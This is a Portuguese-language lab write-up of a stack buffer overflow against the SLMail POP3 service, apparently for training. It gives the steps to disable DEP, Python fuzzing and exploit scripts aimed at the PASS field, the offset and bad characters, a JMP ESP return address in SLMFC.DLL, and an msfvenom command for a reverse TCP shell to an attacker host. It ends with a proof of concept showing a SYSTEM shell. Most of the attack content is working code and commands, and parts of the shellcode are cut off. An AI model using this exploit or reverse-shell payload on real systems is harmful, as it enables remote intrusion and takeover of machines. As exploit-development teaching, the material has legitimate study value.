### [Conceitos](#conceitos)
### Ferramentas
- [Maquina Windows 10](https://www.microsoft.com/es-es/software-download/windows10iso)
- [Immunity Debugger](https://immunityinc.com/products/debugger/)
- [mona.py](https://raw.githubusercontent.com/corelan/mona/master/mona.py) copiar o script e colocar aqui
<img width="1001" height="355" alt="image" src="https://github.com/user-attachments/assets/8ccc000a-b7e6-4677-b0bd-17db1a0c065d" />


- É muito importante desativar o DEP (Data Execution Prevention), caso contrário, os Buffer Overflow que estaremos fazendo não funcionarão.
```
C:\Windows\system32>bcdedit.exe /set {current} nx AlwaysOff
The operation completed successfully.
```

> DEP (Data Execution Prevention) é uma medida de segurança utilizada para impedir a execução de código malicioso em sistemas comprometidos através de um buffer overflow.
> O DEP funciona marcando determinadas áreas da memória como “não executáveis”, o que significa que qualquer tentativa de executar código nessas áreas da memória será bloqueada e ocorrerá uma exceção.
> Isso é especialmente útil para impedir ataques de estouro de buffer que tentam tirar proveito da execução de código em áreas vulneráveis da memória. Ao marcar essas áreas da memória como “não executáveis”, o DEP pode impedir que o código malicioso seja executado e proteger o sistema contra possíveis danos. Ainda assim, isso pode não ser suficiente para impedir que o invasor consiga injetar suas instruções maliciosas.

### Se instalou Python27 no C:\, nao esqueca de colocar as variaveis do ambiente
O Windows precisa saber onde está a python27.dll. Como você instalou diretamente no C:\, o sistema pode não ter mapeado o caminho.
. Pressione a tecla Windows, digite "Variáveis de Ambiente" e selecione "Editar as variáveis de ambiente do sistema".
.Clique em Variáveis de Ambiente no canto inferior direito.
.Em Variáveis do Sistema, encontre a variável Path e clique em Editar.
.Adicione estes dois caminhos (ajuste se o nome da pasta for diferente):
  - C:\Python27

  - C:\Python27\Scripts

Dê OK em tudo e reinicie o Immunity Debugger.


---


**ATENÇÃO! O software smail possui um campo de usuário e senha (é no buffer da senha que se realiza o exploit)!**

Conectamo-nos ao serviço e vemos o banner de resposta, que no script será a variável banner, que terá a mesma resposta.

<img width="640" height="153" alt="image" src="https://github.com/user-attachments/assets/65e388b5-1178-4441-aa23-3957d2c1162e" />

<img width="645" height="186" alt="image" src="https://github.com/user-attachments/assets/4df53624-7731-4bad-982b-7ec65be7e60f" />

### Fase inicial de Fuzzing e assumindo o controle do registro EIP (Instruction Pointer)

> nvim exploit.py (so para tesstar o banner)

```
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "192.168.111.46"
port = 110

def exploit():

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)
    print(banner)

if __name__ == '__main__':

    exploit()
```

<img width="713" height="43" alt="image" src="https://github.com/user-attachments/assets/4b5404c1-4502-43df-a9ef-b16978213865" />

> Abrimos o Immunity como administrators e File -> Attach -> SLMail
<img width="1599" height="471" alt="attach" src="https://github.com/user-attachments/assets/aaca035d-2199-4a5b-a786-0eec08428308" />
<img width="1806" height="904" alt="attached-paused" src="https://github.com/user-attachments/assets/97d5dc34-f6ea-41f0-ac27-46224d2514a7" />
<img width="1793" height="890" alt="running" src="https://github.com/user-attachments/assets/6a014513-4820-42ec-849b-080cbf4770ed" />


> Por enquanto, deixe assim, e podemos testá-lo executando-o quantas vezes ele aguentar (é para testar se ele trava, depois continuamos modificando o script).

```
#!/usr/bin/python3

import socket
import sys

if len(sys.argv) != 2:
    print("\n[!] Usage: exploit.py <length>")
    exit(1)

# Variables globales
ip_address = "192.168.0.140"
port = 110
total_length = int(sys.argv[1])

def exploit():

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)
    
    # Envio do usuário
    s.send(b"USER miguel" + b'\r\n')
    response = s.recv(1024)
    
    # Envio da senha com o buffer de "A"s
    s.send(b"PASS " + b"A"*total_length + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

> Lancamos o explit e podemos ver como quebra o slmial no immunity 
<img width="1808" height="850" alt="crushing" src="https://github.com/user-attachments/assets/2d6915f5-c435-46db-b56c-98934b6a01b2" />


> Por cada vez que quebrar o servicio e encesario parar ele `net stop slmail` e logo comecar `net start slmail` e detach e attach no Immunity novamente


> como vimos que ingresando 5000 caracteres o slmail quebrou vamos fazer um patrao como gdb y modificar o exploit para enviar no payload os caracteres e pegar o EIP no immunity quando slmail quebrar para puder tirar o offset (limite de caracteres para quebrar)
> eu vou usar o pwngdb como extensao para puder trabalhar melhor

```
miguel~ git clone https://github.com/pwndbg/pwndbg
Cloning into 'pwndbg'...
remote: Enumerating objects: 107560, done.
remote: Counting objects: 100% (356/356), done.
remote: Compressing objects: 100% (159/159), done.
remote: Total 107560 (delta 281), reused 198 (delta 197), pack-reused 107204 (from 2)
Receiving objects: 100% (107560/107560), 140.92 MiB | 24.44 MiB/s, done.
Resolving deltas: 100% (60497/60497), done.
miguel~ cd pwndbg/
miguel~/pwndbg ls
CLAUDE.md           Dockerfile           Dockerfile.dnf  flake.nix        LICENSE.md  nix        pwndbginit      scripts       tests          uv.lock
CREDITS.md          Dockerfile.arch      docs            gdbinit.py       lint.sh     profiling  pyproject.toml  setup-dev.sh  tests.sh
docker-compose.yml  Dockerfile.base-apt  flake.lock      kernel-tests.sh  mkdocs.yml  pwndbg     README.md       setup.sh      unit-tests.sh
miguel~/pwndbg ./setup.sh 
```

> cracao de 5000 caracteres
<img width="1919" height="999" alt="image" src="https://github.com/user-attachments/assets/657e7ff3-dc61-4ab9-b748-e7288e549b23" />



> modificamos o script 
```
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "192.168.0.140"
port = 110
payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabt>

def exploit():

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)
    
    # Envio do usuário
    s.send(b"USER miguel" + b'\r\n')
    response = s.recv(1024)
    
    # Envio da senha com o buffer de "A"s
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()

```

> pegamos o EIP
<img width="959" height="534" alt="eip" src="https://github.com/user-attachments/assets/3eec123a-8452-4a47-a4ee-46f1dded33f7" />

> obtemos o offset
<img width="646" height="105" alt="offset" src="https://github.com/user-attachments/assets/8b167158-b721-4f5f-95d1-f846edd60856" />


> modificamos o script
```
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "192.168.0.140"
port = 110
payload = b'A' * 4654 + b'BBBB'

def exploit():

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)
    
    # Envio do usuário
    s.send(b"USER miguel" + b'\r\n')
    response = s.recv(1024)
    
    # Envio da senha com o buffer de "A"s
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()

```


> Podemos ver no EIP que as letras B (42424242) sao escritas confirmando o offset 
<img width="941" height="471" alt="checkoffsetimmunity" src="https://github.com/user-attachments/assets/fffb9a2a-55b9-4f00-a4e4-9dca267551f8" />


> modificamos o script so para ver no stack pointer (ESP) a escrita das letras C
```
....
# Variables globales
ip_address = "192.168.0.140"
port = 110
payload = b'A' * 4654
eip = b'BBBB'
after_eip = b'C'*200

....
s.send(b"PASS " + payload + eip + after_eip + b'\r\n')
....
```

> confirmamos o stack escrito
<img width="947" height="768" alt="CCCCCC" src="https://github.com/user-attachments/assets/a37fc076-1fbb-4351-8cab-b303580957a6" />


### Geracao de de Bytearrays e detecao de Badchars

.  vamos no inmunity e colocamos !mona config -set workingfolder c:\Users\fcastle\Desktop\Analysis
. agora escrevemos !mona bytearray
<img width="1721" height="830" alt="image" src="https://github.com/user-attachments/assets/51cded99-1441-406f-bed1-0b5acf043330" />

<img width="1617" height="797" alt="image" src="https://github.com/user-attachments/assets/35a1d662-39a3-41d1-9b9a-7af47f56f450" />


> No exployt.py modificamos o after_eip com os bytearray e executamos de novo para ver se temos mais badchar que tirar

. `!mona compare -a 0xEIP_ADDRESS -f C:\Users\fcastle\Desktop\Analysis\bytearray.bin` 
 <img width="1479" height="635" alt="image" src="https://github.com/user-attachments/assets/7e38802b-683a-49ba-96b2-3aa461450d4f" />

> tiramos e executamos novamente ate nao ter mais badchars

. `!mona bytearray -cpb "\x00\x0a"`
<img width="1214" height="699" alt="image" src="https://github.com/user-attachments/assets/bb530e21-c73c-4c58-bd55-3e57a81be631" />


> Peagamos os novos bytearrays e colocamos no script
<img width="1519" height="712" alt="image" src="https://github.com/user-attachments/assets/6d902bf8-7f34-4705-b59f-f8ee197ef359" />

> e assim ate nao ter mais badchars
<img width="1692" height="823" alt="image" src="https://github.com/user-attachments/assets/81c6e300-8b3e-4f3c-8c2c-5bdaf3bb441e" />

### **Pesquisa de OpCodes para entrar no ESP e carregar nosso Shellcode**

**ATENÇÃO!!!** Como no final da criação do shellcode colocamos um EXITFUNC=thread, o programa smail não vai travar, pois isso cria um processo filho. Mas todo o resto continua igual.

- shellcode

. `msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.x.x LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0c\x0d' EXITFUNC=thread`
<img width="1762" height="960" alt="shellcode" src="https://github.com/user-attachments/assets/ef540d87-5906-4374-b2c8-0501eb544fb6" />

> Colamos ele no script
```
.......
ayload = b'A' * 4654
eip = b'BBBB'
shellcode = b("\xda\xdd\xba\xae\xfc\x11\xc5\xd9\x74\x24\xf4\x5e\x29\xc9"
b"\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x68\xf8\xf3\x30\x88"
b"\xe9\x76\xba\x70\xea\x16

......
s.send(b"PASS " + payload + eip + shellcode + b'\r\n')
.....
```

> Agora com `!mona modules` procuramos por alguma linea que tenha as quatro primeiras colunas em FALSE

. Por que "False" em tudo? Porque se o ASLR for True, o endereço do JMP ESP muda toda hora e seu exploit para de funcionar.

. Por que "OS DLL" como False? Porque DLLs do Windows (como kernel32.dll) mudam de endereço entre diferentes versões do Windows (XP vs 10). Queremos algo que venha com o próprio SLMail.

<img width="1693" height="565" alt="image" src="https://github.com/user-attachments/assets/66eb6896-d149-43d5-b0ee-0f822d64b617" />

> Dentro do endereco escolhido procuramos pelo salto ao ESP 

. `!mona find -s "\xff\xe4" -m SLMFC.DLL` ou `!mona findwild -s "JMP ESP"`
. ALT + L
 
<img width="1686" height="615" alt="image" src="https://github.com/user-attachments/assets/8043c3cd-e906-479d-9727-3faec06afefb" />

> Usaremos 0x5F4A358F
> Nós a incluímos como eip no script, como é little endian, usamos pack para uma representação correta.

```
.....
from struct import pack
....
eip = pack("<L", 0x5F4A358F)
....
```

> Verificamos haciendo un breackpoint para ver si realmente cae en el esp, start immunity :

. seta azul (Go to Address in Dissassembler, fica antes da letra l)-> colocamos o endereco -> ok
si le erra a la direccion volvemos apretar en la flechita azul y ponemos la direccion

. Agora lanca o exploit

. Agora o botao step into (logo do pausa) e verificamos se o EIP tem o mesmo valor que ESP

<img width="1741" height="746" alt="image" src="https://github.com/user-attachments/assets/f7b19758-111e-45f3-bed9-2eaa90cd256a" />

### **Uso de NOPs, deslocamentos na pilha e interpretação do Shellcode para obter RCE**

> Criamos os códigos nop para dar um tempo na interpretação do shellcode

```
....
s.send(b"PASS " + payload + eip + b'\x90'*16 + shellcode + b'\r\n')
.....
```

### PoC

> Lancamos o exploit e obtemos uma consola como system



<img width="1810" height="909" alt="image" src="https://github.com/user-attachments/assets/2e9300d0-472a-4d63-94f9-4a19056ebd45" />


<img width="750" height="911" alt="image" src="https://github.com/user-attachments/assets/5173f7a7-7d83-47e0-a174-a83f8d00aa94" />


<img width="1386" height="793" alt="image" src="https://github.com/user-attachments/assets/c83c9928-2be2-4c1c-94fb-c3394d433a37" />


---


### Conceitos

1. O Offset (A Precisão)
O número 4654 não é aleatório.
O que é: A distância exata entre o início do seu texto e o ponto onde o processador guarda o endereço da próxima instrução que ele deve executar.
Como achamos: Usando ferramentas como o pattern_create e pattern_offset. Se errar por 1 byte, o programa trava, mas você não ganha o controle.

2.O EIP (O Volante do Carro)
Você definiu como 0x5F4A358F (invertido no Python como \x8f\x35\x4a\x5f).
O que é: Extended Instruction Pointer. É o registrador que diz ao processador: "Execute a instrução que está no endereço X".
O "Pulo do Gato": Ao sobrescrever o EIP com o endereço de um JMP ESP, você sequestra o fluxo do programa. Em vez de ele seguir o caminho normal, ele vai para onde você mandar.

3. O JMP ESP (O Trampolim)
A instrução \xff\xe4 que o Mona encontrou para você.
O que é: Uma instrução que diz: "Pule agora para onde o topo da pilha (ESP) aponta".
Por que não usar o endereço do shellcode direto? Porque o endereço da pilha muda a cada execução (devido ao ASLR ou mudanças no ambiente). O endereço dentro da DLL SLMFC.DLL é estático (não muda), servindo como um GPS confiável que sempre te leva de volta para a sua carga maliciosa.

4. O NOP Sled (O Tapete de Boas-Vindas)
O que é: No Operation. É uma instrução que não faz nada, apenas passa para a próxima.
Por que: Às vezes, o "pulo" do JMP ESP cai alguns bytes antes ou depois do início do shellcode devido a pequenas variações na memória. Os NOPs criam uma "pista de pouso" segura. Se o processador cair em qualquer um dos 32 NOPs, ele vai escorregando até bater no início do shellcode.

5. O Shellcode (A Carga Útil)
O código gerado pelo msfvenom.
O que é: Instruções em linguagem de máquina (Assembly) que forçam o computador da vítima a abrir uma conexão de volta para o seu IP (Reverse Shell).
Bad Characters: No seu caso, removemos \x00\x0a\x0b\x0c\x0d porque o protocolo POP3 entende esses bytes como "fim de linha" ou "fim de comando". Se eles estivessem no meio do código, o SLMail cortaria o resto do seu shellcode.





